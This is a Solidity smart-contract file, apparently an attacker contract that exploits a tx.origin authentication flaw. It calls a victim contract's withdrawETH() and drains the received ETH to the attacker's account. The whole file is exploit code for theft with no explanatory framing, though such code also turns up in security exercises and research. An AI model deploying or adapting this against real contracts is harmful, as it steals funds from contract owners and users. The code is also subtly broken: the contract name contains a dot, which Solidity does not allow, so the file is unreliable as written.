// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IVictim {
    function withdraw(address _token) external;
    function withdrawETH() external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract tx.originAttacker {
    address private immutable owner;
    IVictim private immutable victimContract;

    constructor(address _victim) {
        owner = msg.sender;
        victimContract = IVictim(_victim);
    }

    function attackETH() external {
       victimContract.withdrawETH();
    }

    function drainETH() external {
        require(msg.sender == owner, "Only attacker EOA can call");
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH to drain");
        payable(owner).transfer(bal);
    }

    receive() external payable {}
}
